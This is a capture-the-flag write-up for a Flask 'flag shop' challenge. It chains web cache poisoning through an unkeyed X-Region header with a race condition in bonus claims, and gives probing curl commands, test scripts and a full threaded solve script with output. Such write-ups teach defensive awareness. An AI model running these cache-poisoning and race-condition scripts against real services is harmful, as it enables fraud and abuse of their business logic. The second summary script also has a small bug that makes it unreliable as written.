# Ozymandias CTF Challenge Writeup

**Challenge:** Ozymandias  
**Event:** Cybears CTF  
**Category:** Web  
**Difficulty:** Medium

I created this challenge for Cybears CTF, a Capture The Flag competition focused on the Africa region. The event brought together many talented teams from across the continent, making it an exciting competition with high-quality participation.

A Flask web application that requires exploiting a cache poisoning vulnerability combined with a race condition to obtain the premium flag without paying for it.

---

## TL;DR

This challenge chains two main vulnerabilities to achieve the goal:
1. **Web Cache Poisoning** - Using unkeyed HTTP headers to poison the cache and bypass region restrictions
2. **Race Condition** - Exploiting concurrent bonus claims to accumulate enough balance for the premium flag

---

Now lock your seatbelts and let's start

![say my name](./say_my_name.gif)

---

## Overview

**Ozymandias** is a "Flag Shop" web application where users can:
- Register and login to the platform
- Claim a first-time bonus (restricted by region validation)
- Purchase flags using their account balance
- The goal is to purchase the expensive "Heisenberg" flag worth $99.99

The application consists of:
1. **Flask Backend** (Python) - Handles user authentication, bonus claims, and flag purchases
2. **Static Server** (Nginx) - Serves static files including a `locations.js` file used for region validation
3. **SQLite Database** - Stores user data and purchase history

---

## Application Architecture

### Flask Application (Port 5000/8088)
The main application has these key endpoints:
- `/register` - User registration
- `/login` - User authentication
- `/claim-bonus` - Claims a $10 first-time bonus (with region validation)
- `/purchase` - Purchase flags with account balance
- `/profile` - View purchase history

### Static Server (Nginx)
- Serves static files at `http://nginx:80/static`
- Has a caching layer for performance
- Key file: `/static/js/locations.js` - contains valid region codes

### Bonus Claim Mechanism

The `/claim-bonus` endpoint is the heart of this challenge. Let's examine its logic:

```python
@app.route('/claim-bonus', methods=['POST'])
@login_required
def claim_bonus():
    data = request.get_json()
    location = data.get('location')
    
    # Fetches locations.js with X-Region header
    locations_url = f"{STATIC_SERVER_URL}/js/locations.js?u={username}"
    headers = {"X-Region": "US-NYC"}
    
    resp = requests.get(locations_url, headers=headers, timeout=5)
    
    if resp.status_code == 503:
        # Service unavailable - grants bonus without validation!
        if user['bonus_claimed']:
            return jsonify({'error': 'First time bonus already claimed!'}), 400
        
        time.sleep(1)
        requests.get(locations_url, headers=headers, timeout=5)
        
        conn.execute('update users set balance = balance + 10.0, bonus_claimed = TRUE where id = ? ', (session['user_id'],))
        conn.commit()
    else:
        # Normal flow - validates location from locations.js
        # Parses locations.js and checks if location is valid
        # Only grants bonus if bonus_claimed = FALSE
```

The critical observation here is the **two different code paths**:
1. When `locations.js` returns 503 → Bonus is granted **without proper transaction safety**
2. When `locations.js` returns 200 → Bonus is granted using a proper atomic SQL UPDATE

---

## Vulnerability Analysis

### Vulnerability #1: Cache Poisoning via Unkeyed Headers

The static server (Nginx) has a caching mechanism. When we examine the bonus claim flow, we see:

```python
locations_url = f"{STATIC_SERVER_URL}/js/locations.js?u={username}"
headers = {"X-Region": "US-NYC"}
resp = requests.get(locations_url, headers=headers, timeout=5)
```

The application sends an `X-Region` header to fetch `locations.js`. But is this header part of the cache key?

**Understanding the Cache Key:**

Since we didn't have access to the cache configuration, I needed to understand how the cache key was constructed. Let me show you how I tested this systematically.

First, let's test if query parameters are part of the cache key:

```bash
# Request 1: Initial request
curl "http://target/static/js/locations.js?test=value1" -H "X-Region: header1"

# Request 2: Same URL, different header
curl "http://target/static/js/locations.js?test=value1" -H "X-Region: header2"
```

If Request 2 returns the same response as Request 1 (cached), then query params are in the cache key but `X-Region` is not.

Testing the `User-Agent` header:

```bash
# Request 1
curl "http://target/static/js/locations.js" -H "User-Agent: TestAgent1"

# Request 2 - Different User-Agent
curl "http://target/static/js/locations.js" -H "User-Agent: TestAgent2"
```

If both requests return different responses (or cache misses), then `User-Agent` is part of the cache key.

After this methodical testing, I confirmed:
- ✅ Query parameters - **part of the cache key**
- ✅ User-Agent header - **part of the cache key**
- ✅ URL path - **part of the cache key**
- ❌ `X-Region` header - **NOT part of the cache key**

The `X-Region` header was the unkeyed input! Now let's test if we can exploit it:

```bash
# Step 1: Send a request with X-Region that might cause an error
curl "http://target/static/js/locations.js?u=testuser" -H "X-Region: INVALID-REGION"

# Step 2: Request the same URL without the header
curl "http://target/static/js/locations.js?u=testuser"
```

If the second request returns the error response from the first request, we've successfully poisoned the cache!

**Finding the Blocked Region:**

Next, I needed to find which region codes would trigger a 503 error response. Let's test systematically:

```python
# Testing script
regions_to_test = [
    "US-NYC",  # United States - New York
    "EU-LON",  # Europe - London  
    "CN-BEI",  # China - Beijing
    "RU-MOW",  # Russia - Moscow
    "IR-TEH",  # Iran - Tehran
    "KP-PYO",  # North Korea - Pyongyang
]

for region in regions_to_test:
    headers = {"X-Region": region}
    resp = requests.get(f"{base_url}/static/js/locations.js", headers=headers)
    print(f"{region}: {resp.status_code}")
    if resp.status_code == 503:
        print(f"✓ Found blocked region: {region}")
        break
```

Running this script:

```
US-NYC: 200
EU-LON: 200
CN-BEI: 200
RU-MOW: 503
✓ Found blocked region: RU-MOW
```

Perfect! `RU-MOW` (Russia - Moscow) returns a 503 Service Unavailable response. Now we have everything we need for the cache poisoning attack!

**The Attack:**
1. Send a request to `/static/js/locations.js?u=victim_username` with `X-Region: RU-MOW` (the blocked region we discovered)
2. The static server caches the 503 error response for this URL
3. When the application tries to validate the location for this user, it gets the cached 503 response
4. The bonus is granted **without validation**!

Let's look at the solve script:

```python
def poison_the_cache():
    headers = {
        "User-Agent": "python-requests/2.32.2",
        "X-Region": "RU-MOW"  # The blocked region we found through testing
    }
    resp = session.get(f"{base_url}{static_path}?u={username}", headers=headers)
    return (resp.status_code, resp.text)
```

By sending `X-Region: RU-MOW`, we poison the cache for our specific username parameter. Now when the application validates our bonus claim, it receives a 503 status code!

### Vulnerability #2: Race Condition in Bonus Claims

Now that we can trigger the 503 code path, let's examine it more carefully:

```python
if resp.status_code == 503:
    user = conn.execute(
        'SELECT * FROM users WHERE id = ?',
        (session['user_id'],)
    ).fetchone()
    if user['bonus_claimed']:
        conn.close()
        return jsonify({'error': 'First time bonus already claimed!'}), 400
    
    time.sleep(1)  # Interesting... why is there a sleep here?
    requests.get(locations_url, headers=headers, timeout=5)
    
    conn.execute('update users set balance = balance + 10.0, bonus_claimed = TRUE where id = ? ', (session['user_id'],))
    conn.commit()
```

**Spotting the Vulnerability:**

Notice the pattern:
1. **CHECK** if `bonus_claimed` is False
2. **SLEEP** for 1 second
3. **UPDATE** balance and set `bonus_claimed = TRUE`

This sleep creates a suspicious gap between the check and the update. What if we send multiple requests during this window?

**Testing for Race Condition:**

Let's write a simple test to verify if this is exploitable:

```python
import threading
import requests

def claim_bonus():
    data = {"location": "US-NYC"}
    resp = session.post(f"{base_url}/claim-bonus", json=data)
    print(f"Response: {resp.status_code}, Balance: {resp.json().get('new_balance')}")

# Send 3 concurrent requests
threads = []
for i in range(3):
    t = threading.Thread(target=claim_bonus)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

Running this test after cache poisoning:

```
Response: 200, Balance: 10.0
Response: 200, Balance: 20.0
Response: 200, Balance: 30.0
```

Bingo! All three requests succeeded. This is a classic **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability. Multiple concurrent requests all pass the check in step 1 before any of them reaches step 3!

**Why Does This Happen?**

The check and update are not atomic. Compare this to the safe version in the normal flow:

```python
cur = conn.execute(
    '''
    UPDATE users
    SET balance = balance + 10.0,
        bonus_claimed = TRUE
    WHERE id = ?
    AND bonus_claimed = FALSE
    ''',
    (session['user_id'],)
)
if cur.rowcount == 0:
    return jsonify({'error': 'First time bonus already claimed!'}), 400
```

This uses an **atomic UPDATE with WHERE condition** at the database level. Only one request can successfully update when `bonus_claimed = FALSE`, and subsequent requests will have `rowcount == 0`.

The vulnerable 503 path lacks this protection, making it exploitable through concurrent requests.

---

## The Path to the Flag

Now that we've identified and tested both vulnerabilities, let's chain them together for the complete exploit.

**The Strategy:**
- Need $99.99 for the Heisenberg flag
- Each bonus claim gives $10
- With the race condition, we can claim the bonus ~10 times
- Cache poisoning enables the vulnerable 503 code path

### Building the Full Exploit

### Building the Full Exploit

Here's the complete exploit code:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid

base_url = "https://ozymandias.ctf.clawtheflag.com"
session = requests.Session()
username = "exploit_" + str(uuid.uuid4())[:8]
email = f"{username}@test.com"

def register_user():
    data = {
        "username": username,
        "email": email,
        "password": "test1234",
        "confirm_password": "test1234"
    }
    resp = session.post(f"{base_url}/register", json=data)
    print(f"[+] Registered user: {username}")
    return (resp.status_code, resp.text)

def poison_the_cache():
    headers = {
        "User-Agent": "python-requests/2.32.2",
        "X-Region": "RU-MOW"
    }
    resp = session.get(f"{base_url}/static/js/locations.js?u={username}", 
                      headers=headers)
    print(f"[+] Cache poisoning: {resp.status_code}")
    return (resp.status_code, resp.text)

def get_bonus():
    data = {"location": "US-NYC"}
    resp = session.post(f"{base_url}/claim-bonus", json=data)
    return (resp.status_code, resp.text)

def batch_get_bonus(max_workers=10, count=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(get_bonus) for _ in range(count)]
        for future in as_completed(futures):
            results.append(future.result())
    return results

def get_flag():
    data = {"flag_id": "heisenberg", "location": "anywhere"}
    resp = session.post(f"{base_url}/purchase", json=data)
    return resp.json().get('flag', 'No flag received')

if __name__ == "__main__":
    print("[*] Starting exploit...")
    
    register_user()
    
    res = poison_the_cache()
    if res[0] != 503:
        print("[-] Cache poisoning failed, exiting.")
        exit(1)
    
    print("[+] Cache poisoned successfully!")
    print("[*] Exploiting race condition...")
    
    results = batch_get_bonus(max_workers=10, count=10)
    successful = sum(1 for status, _ in results if status == 200)
    print(f"[+] Successfully claimed bonus {successful} times")
    
    print("[*] Purchasing Heisenberg flag...")
    flag = get_flag()
    print(f"\n[+] FLAG: {flag}")
```

### Running the Exploit

```bash
$ python solve.py
[*] Starting exploit...
[+] Registered user: exploit_a7f3d9e2
[+] Cache poisoning: 503
[+] Cache poisoned successfully!
[*] Exploiting race condition...
[+] Successfully claimed bonus 10 times
[*] Purchasing Heisenberg flag...

[+] FLAG: cybears{cache_poisoning_to_dos_to_race_condition_to_win}
```

🎉 Success!

---

## Summary of the Complete Exploit Chain

Here's the final exploit code that chains everything together:

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid

base_url = "https://ozymandias.ctf.clawtheflag.com"
session = requests.Session()
username = "fodhil22" + str(uuid.uuid4())
email = "test@gmail.com" + str(uuid.uuid4())

# Step 1: Register user
register_user()

# Step 2: Poison the cache
res = poison_the_cache()
if res[0] != 503:
    print("Cache poisoning failed, exiting.")
    exit(1)

# Step 3: Exploit race condition
for status, body in batch_get_bonus(max_workers=10, count=10):
    print(f"Status: {status}, Balance updated: {body}")

# Step 4: Purchase the flag
flag_response = get_flag()
print(f"Flag: {flag_response[1]}")
```

**Execution Flow:**
1. Creates a fresh user account
2. Poisons the cache for this user's locations.js URL with the blocked region header
3. Sends 10 concurrent bonus claim requests, exploiting the race condition
4. Accumulates ~$100 in the account balance
5. Purchases the Heisenberg flag and displays it!

and gg thanks for reading hope u liked it. 

![ozymendias](./ozymendias.gif)


---

## Key Takeaways

